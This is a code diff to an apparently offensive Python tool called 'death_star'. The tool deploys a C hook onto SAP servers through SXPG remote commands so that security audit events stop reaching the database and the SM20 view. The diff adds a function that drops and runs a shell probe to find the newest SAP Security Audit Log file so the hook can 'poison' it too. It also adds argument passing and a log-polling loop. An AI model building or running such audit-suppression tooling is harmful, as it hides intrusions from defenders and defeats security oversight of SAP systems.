@@ -732,6 +732,89 @@ def find_worker_pid(node,
         "as <sid>adm.")
 
 
+def _discover_audit_file(node, sid: str,
+                            remote_dir: str = DEFAULT_REMOTE_DIR
+                            ) -> Optional[str]:
+    """Discover the newest SAP Security Audit Log ``.AUD`` file on the
+    target.
+
+    SAP writes SAL to ``<DIR_AUDIT>/<FN_AUDIT>``.  Julian's C hook tries
+    to recover DIR_AUDIT from ``disp+work``'s symbol ``NM_H_RSAU_FILE``
+    at attach time, but that symbol is Build-A-only (per the hook's own
+    comment at line 60) and is missing on kernel 793 SUSE builds — the
+    hook then emits ``[warn] could not find audit log file; use
+    --audit-file``.  We probe for it explicitly here so the hook can
+    inotify-poison the file too, not just the DB writes.
+
+    Strategy: iterate ``/usr/sap/<SID>/<INST>/log/*.AUD`` for every
+    instance of this SID, ordered by mtime, return the newest.  On DB-
+    recording-only targets there are no ``.AUD`` files at all — we
+    return ``None`` and the hook runs without ``--audit-file`` (the
+    warning becomes moot because there's no file sink to poison).
+
+    Returns the absolute path (e.g. ``/usr/sap/S4H/D00/log/20260708000000.AUD``)
+    or ``None`` if no file was found or the probe failed.
+    """
+    scratch_sh = (f"{remote_dir.rstrip('/')}/"
+                    f"sapmap_ds_audfind_{_rand_suffix()}.sh")
+    # POSIX sh — ``find`` -printf ``%T@ %p`` gives us epoch mtime +
+    # path; sort -rn puts the newest first; head -1 picks it.  The
+    # awk strips the timestamp column back off so we only get the
+    # path.  All widely available (busybox find lacks ``-printf`` on
+    # some distros — fall back to plain ``ls -1t`` for those).
+    script = (
+        "#!/bin/sh\n"
+        f"SID={sid}\n"
+        # Primary: find under /usr/sap/<SID>/*/log/*.AUD
+        "PATHS=`find /usr/sap/$SID -maxdepth 4 -type f -name '*.AUD' "
+        "-printf '%T@ %p\\n' 2>/dev/null | sort -rn | head -1 "
+        "| awk '{print $2}'`\n"
+        "if [ -z \"$PATHS\" ]; then\n"
+        # Fallback for busybox-find (no -printf).  ls -1t sorts by
+        # mtime descending; find with -exec ls would be simpler but
+        # SXPG params can't have shell metacharacters, and busybox
+        # ls doesn't group across dirs — hence the loop.
+        "  for d in /usr/sap/$SID/*/log; do\n"
+        "    [ -d \"$d\" ] || continue\n"
+        "    f=`ls -1t \"$d\"/*.AUD 2>/dev/null | head -1`\n"
+        "    if [ -n \"$f\" ]; then\n"
+        "      PATHS=\"$f\"\n"
+        "      break\n"
+        "    fi\n"
+        "  done\n"
+        "fi\n"
+        "if [ -n \"$PATHS\" ]; then\n"
+        "  echo AUDIT_FILE: $PATHS\n"
+        "else\n"
+        "  echo AUDIT_FILE: (none)\n"
+        "fi\n"
+    )
+    try:
+        _write_remote_file(node, scratch_sh, script.encode("utf-8"),
+                            label=f"drop audit-file probe → {scratch_sh}")
+    except DeathStarError as e:
+        print(f"[!] {node.sid}: death_star: could not drop audit-file "
+               f"probe: {e}")
+        return None
+
+    r = _run(node, "sh", scratch_sh, label="probe for SAP audit file")
+    _run(node, "/bin/rm", f"-f {scratch_sh}",
+          label="cleanup audit-file probe")
+
+    for line in r.get("output") or []:
+        s = line.strip()
+        if s.startswith("AUDIT_FILE:"):
+            path = s[len("AUDIT_FILE:"):].strip()
+            if path and path != "(none)":
+                print(f"[*] {node.sid}: death_star: discovered SAL file "
+                       f"→ {path}")
+                return path
+    print(f"[*] {node.sid}: death_star: no SAL .AUD file found under "
+           f"/usr/sap/{sid}/*/log — target may be DB-recording only "
+           f"(hook runs without --audit-file)")
+    return None
+
+
 def _find_workers_via_proc(node,
                               remote_dir: str = DEFAULT_REMOTE_DIR
                               ) -> tuple[list, list]:
@@ -815,6 +898,7 @@ def launch(node, binary_path: str,
              filter_classes: str = "", verbose: bool = False,
              log_path: Optional[str] = None,
              pidfile_path: Optional[str] = None,
+             audit_file: Optional[str] = None,
              remote_dir: str = DEFAULT_REMOTE_DIR) -> int:
     """Launch the hook in ``--suppress`` mode, detached from the
     operator's SXPG session so it survives after the RFC round-trip
@@ -865,6 +949,18 @@ def launch(node, binary_path: str,
         args.extend(["--pid", str(target_pid)])
     if cls_str:
         args.extend(["--filter", cls_str])
+    # ``--audit-file`` overrides the C hook's ``find_audit_file()``
+    # symbol-scan, which is Build-A-only and comes up empty on modern
+    # SUSE-built kernels (e.g. 793 on S/4HANA 2023).  Absent the flag,
+    # the hook only suppresses DB writes; the file-based SAL sink
+    # keeps recording.  We validate the path here — SAP audit files
+    # live under /usr/sap/<SID>/<INST>/log and are all named .AUD.
+    if audit_file:
+        if not re.fullmatch(r"[A-Za-z0-9_/.\-]+", audit_file):
+            raise DeathStarError(
+                f"invalid audit_file {audit_file!r}: expected a plain "
+                "POSIX path — no shell metacharacters allowed")
+        args.extend(["--audit-file", audit_file])
     if verbose:
         args.append("-v")
     hook_cmdline = " ".join(args)
@@ -1476,11 +1572,18 @@ def deploy_and_launch(node, filter_classes: str = "",
     else:
         target_comm = f"(operator-supplied PID {target_pid})"
 
+    # Auto-discover the SAL file so the hook can inotify-poison it too.
+    # On DB-only recording targets returns None; the hook then runs
+    # without --audit-file (nothing to poison on the FS side).
+    audit_file = _discover_audit_file(node, node.sid,
+                                        remote_dir=remote_dir)
+
     hook_pid = launch(node, binary_path, target_pid,
                        filter_classes=filter_classes,
                        verbose=verbose,
                        log_path=log_path,
                        pidfile_path=pidfile_path,
+                       audit_file=audit_file,
                        remote_dir=remote_dir)
 
     # Post-arm log dump — critical diagnostic surface.  Julian's C
@@ -1491,9 +1594,31 @@ def deploy_and_launch(node, filter_classes: str = "",
     # unrelated bytes) — and those refusals only surface via the log.
     # Auto-dumping saves the operator a manual ``cat`` on the target
     # to figure out why SM20 still shows events.
+    #
+    # Poll ``wc -c`` up to 5x with a 2 s gap between attempts before
+    # giving up.  Previous single-shot 3 s wait produced a false
+    # "log is empty" report on SUSE targets even when the hook had
+    # already written its startup banner + attach lines — SXPG's read
+    # side lagged behind the kernel page cache by a few seconds.
     import time as _time
-    _time.sleep(3)  # launcher waits 2s; add 3s for attach + log flush
-    log_tail = read_hook_log(node, log_path, max_lines=60)
+    log_tail: list = []
+    for attempt in range(5):
+        _time.sleep(2)
+        _wc = _run(node, "wc", f"-c {log_path}",
+                    label=f"post-arm log size check "
+                          f"(attempt {attempt + 1}/5)")
+        size = 0
+        for line in _wc.get("output") or []:
+            parts = line.strip().split()
+            if parts and parts[0].isdigit():
+                size = int(parts[0])
+                break
+        if size > 0:
+            log_tail = read_hook_log(node, log_path, max_lines=60)
+            if log_tail:
+                break
+        print(f"[*] {node.sid}: death_star: log at {log_path} is still "
+               f"empty ({size} B) after {(attempt + 1) * 2}s — waiting")
     attach_ok = sum(1 for ln in log_tail if "attached pid" in ln)
     plant_fails = sum(1 for ln in log_tail
                        if "failed to plant" in ln or "expected CALL" in ln)
@@ -1513,9 +1638,10 @@ def deploy_and_launch(node, filter_classes: str = "",
                    f"``rsauwr1ex`` layout.")
     else:
         print(f"[*] {node.sid}: death_star: hook log at {log_path} is "
-               f"empty — the hook may be running in silent mode or the "
-               f"log path is wrong.  Check on the target with "
-               f"``ls -la {log_path}``.")
+               f"still empty after 10s of polling — the hook may be "
+               f"running silently or SXPG is caching the read.  Check "
+               f"the target directly with ``ls -la {log_path}`` and "
+               f"``cat {log_path}``.")
 
     return {
         "ok": True,
@@ -1528,6 +1654,7 @@ def deploy_and_launch(node, filter_classes: str = "",
         "hook_pid": hook_pid,
         "log_path": log_path,
         "pidfile_path": pidfile_path,
+        "audit_file": audit_file,          # None → DB-only recording
         "filter_classes": filter_classes,
         "log_tail": log_tail,
         "attach_ok_count": attach_ok,
